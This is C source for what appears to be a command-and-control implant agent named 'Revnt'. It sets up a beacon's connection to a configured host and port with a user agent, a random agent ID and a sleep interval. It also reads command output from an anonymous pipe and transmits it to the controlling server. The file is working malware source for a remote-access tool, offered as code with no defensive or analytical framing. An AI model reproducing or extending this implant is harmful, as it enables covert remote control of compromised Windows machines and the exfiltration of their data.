#include <Revnt.h>

#include <Core.h>
#include <Config.h>
#include <Package.h>
#include <Command.h>

VOID RevntInit()
{
    // Init Connection info
    Instance.Config.Transport.UserAgent = CONFIG_USER_AGENT;
    Instance.Config.Transport.Host      = CONFIG_HOST;
    Instance.Config.Transport.Port      = CONFIG_PORT;
    Instance.Config.Transport.Secure    = CONFIG_PORT;

    // Init Win32
    Instance.Win32.RtlRandomEx   = GetProcAddress( GetModuleHandleA( "ntdll" ), "RtlRandomEx" );
    Instance.Win32.RtlGetVersion = GetProcAddress( GetModuleHandleA( "ntdll" ), "RtlGetVersion" );

    Instance.Session.AgentID = RandomNumber32();
    Instance.Config.Sleeping = CONFIG_SLEEP;

    printf( "AgentID     => %x\n", Instance.Session.AgentID );
    printf( "Magic Value => %x\n", REVNT_MAGIC_VALUE );
}

VOID AnonPipeRead( HANDLE hSTD_OUT_Read )
{
    PPACKAGE Package         = NULL;
    LPVOID   pOutputBuffer   = NULL;
    UCHAR    buf[ 1025 ]     = { 0 };
    DWORD    dwBufferSize    = 0;
    DWORD    dwRead          = 0;
    BOOL     SuccessFul      = FALSE;

    pOutputBuffer = LocalAlloc( LPTR, sizeof(LPVOID) );

    do
    {
        SuccessFul = ReadFile( hSTD_OUT_Read, buf, 1024, &dwRead, NULL );

        if ( dwRead == 0)
            break;

        pOutputBuffer = LocalReAlloc(
            pOutputBuffer,
            dwBufferSize + dwRead,
            LMEM_MOVEABLE | LMEM_ZEROINIT
        );

        dwBufferSize += dwRead;

        memcpy( pOutputBuffer + ( dwBufferSize - dwRead ), buf, dwRead );
        memset( buf, 0, dwRead );

    } while ( SuccessFul == TRUE );

    Package = PackageCreate( COMMAND_OUTPUT );

    PackageAddBytes( Package, pOutputBuffer, dwBufferSize );
    PackageTransmit( Package, NULL, NULL );

    memset( pOutputBuffer, 0, dwBufferSize );
    LocalFree( pOutputBuffer );
    pOutputBuffer = NULL;
}

ULONG RandomNumber32( VOID )
{
    ULONG Seed = 0;

    Seed = GetTickCount();
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;

    return Seed % 2 == 0 ? Seed : Seed + 1;
}
